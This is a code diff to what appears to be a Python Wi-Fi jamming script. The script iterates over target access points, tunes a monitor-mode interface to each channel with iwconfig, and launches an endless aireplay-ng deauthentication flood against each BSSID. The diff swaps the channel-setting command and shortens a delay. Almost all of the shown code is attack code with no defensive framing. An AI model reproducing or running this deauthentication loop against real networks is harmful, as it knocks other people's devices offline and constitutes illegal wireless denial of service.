@@ -82,10 +82,10 @@ for r in range(0,5):
             break
         BSSID=targets[target][0]
         ch=targets[target][1]
-        chanfix=['airodump-ng','-a','-c',ch,iface+'mon']
+        chanfix=['iwconfig',iface+'mon','channel',ch]#['airodump-ng','-a','-c',ch,iface+'mon']
         jamm=['aireplay-ng','-0','0','-a',BSSID,iface+'mon']
         chproc=Popen(chanfix)
-        time.sleep(0.2)
+        time.sleep(0.05)
         jamproc=Popen(jamm)
         startofjam=time.time()
         send_interrupt(chproc)
@@ -96,7 +96,4 @@ for r in range(0,5):
                 time.sleep(0.5)
         target=target+1
 exit()
-
-
-
 
